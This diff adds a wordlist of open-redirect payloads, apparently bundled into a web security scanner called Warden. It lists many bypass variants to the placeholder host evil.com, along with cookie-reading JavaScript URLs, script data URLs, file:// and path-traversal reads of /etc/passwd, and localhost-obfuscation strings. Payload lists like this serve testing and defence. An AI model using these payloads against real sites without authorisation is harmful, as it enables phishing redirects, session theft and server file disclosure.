@@ -1,0 +1,205 @@
+# Open redirect payload wordlist
+# Embedded in Warden binary
+
+# Basic malicious URLs
+https://evil.com
+http://evil.com
+//evil.com
+https://evil.com/
+http://evil.com/
+//evil.com/
+https://evil.com/malicious
+http://evil.com/malicious
+
+# Protocol-relative URLs
+//evil.com
+//evil.com/
+//www.evil.com
+//evil.com/path
+//evil.com/path?param=value
+
+# URL with @ symbol (credential bypass)
+@evil.com
+https://target.com@evil.com
+http://target.com@evil.com
+https://user:pass@evil.com
+http://user:pass@evil.com
+//target.com@evil.com
+
+# Subdomain bypass
+https://target.com.evil.com
+http://target.com.evil.com
+https://target.com.evil.com/
+http://target.com.evil.com/
+https://www.target.com.evil.com
+http://www.target.com.evil.com
+https://a.b.target.com.evil.com
+http://a.b.target.com.evil.com
+https://target.com.evil.com/path
+http://target.com.evil.com/path
+
+# URL starting with / (path manipulation)
+/evil.com
+//evil.com
+/ /evil.com
+/ / /evil.com
+/./evil.com
+/././evil.com
+/../../evil.com
+/../../../evil.com
+/../../../../evil.com
+
+# Backslash bypass
+\\evil.com
+\\\evil.com
+\\\\evil.com
+\evil.com
+/\evil.com
+/\evil.com/
+/\\evil.com
+
+# Unicode and encoding bypasses
+%2f/evil.com
+%2f%2fevil.com
+%5c%5cevil.com
+%2F%2Fevil.com
+%5C%5Cevil.com
+%00.evil.com
+%0a.evil.com
+%0d.evil.com
+%09.evil.com
+%20.evil.com
+%09.evil.com
+%2e.evil.com
+
+# Fragment bypass
+#evil.com
+#//evil.com
+#https://evil.com
+#http://evil.com
+/#evil.com
+//#evil.com
+
+# Data URL
+data:text/html,<script>alert(1)</script>
+data:text/html;charset=utf-8,<script>alert(1)</script>
+data:text/html,<h1>XSS</h1>
+
+# JavaScript URL
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:document.location='http://evil.com'
+
+# File URL
+file:///etc/passwd
+file:///C:/Windows/win.ini
+file:///etc/hosts
+
+# FTP URL
+ftp://evil.com
+ftp://evil.com:21
+ftp://user:pass@evil.com
+
+# Common parameter values
+/../../../../../../etc/passwd
+/../../../../../../windows/win.ini
+/\..\..\..\..\..\..\windows/win.ini
+
+# Case mixing bypass
+HTtP://evil.com
+HtTp://evil.com
+HtTpS://evil.com
+htTp://evil.com
+hTtp://evil.com
+HTTP://evil.com
+HTTPS://evil.com
+http://eViL.cOm
+http://evil.CoM
+
+# Domain mixing
+http://evil.com.com
+http://evil.com@www.target.com
+http://www.evil.com@target.com
+http://target.com.evil.com@www.target.com
+
+# URL with port
+http://evil.com:80
+https://evil.com:443
+http://evil.com:8080
+https://evil.com:8443
+//evil.com:80
+
+# IP address based
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://2130706433
+http://0x7f000001
+http://0177.0.0.1
+http://127.1
+http://127.0.1
+http://2130706433@evil.com
+
+# TLD bypass
+http://evil.com.evil.com
+http://evil.com.com
+http://evil.com.org
+http://evil.com.net
+
+# Common redirect parameters with malicious payloads
+?next=http://evil.com
+?redirect=http://evil.com
+?url=http://evil.com
+?link=http://evil.com
+?goto=http://evil.com
+?return=http://evil.com
+?returnTo=http://evil.com
+?return_to=http://evil.com
+?target=http://evil.com
+?dest=http://evil.com
+?destination=http://evil.com
+?ref=http://evil.com
+?referer=http://evil.com
+?out=http://evil.com
+?outUrl=http://evil.com
+?view=http://evil.com
+?to=http://evil.com
+?uri=http://evil.com
+?path=http://evil.com
+?continue=http://evil.com
+?callback=http://evil.com
+?redirectUrl=http://evil.com
+?redirect_uri=http://evil.com
+?redirect_to=http://evil.com
+?success=http://evil.com
+?success_url=http://evil.com
+?checkout=http://evil.com
+?checkout_url=http://evil.com
+?forward=http://evil.com
+?forwards=http://evil.com
+?origin=http://evil.com
+?location=http://evil.com
+?window=http://evil.com
+?next_page=http://evil.com
+?next_url=http://evil.com
+?newurl=http://evil.com
+?redir=http://evil.com
+?redirurl=http://evil.com
+?route=http://evil.com
+?rurl=http://evil.com
+?l=http://evil.com
+?file=http://evil.com
+?file=http://evil.com
+?link=http://evil.com
+?back=http://evil.com
+?backurl=http://evil.com
+?q=http://evil.com
+?w=http://evil.com
+?auth=http://evil.com
+
+# Trailing slash variants
+http://evil.com/
+http://evil.com//
+http://evil.com///
+http://evil.com////
+http://evil.com//
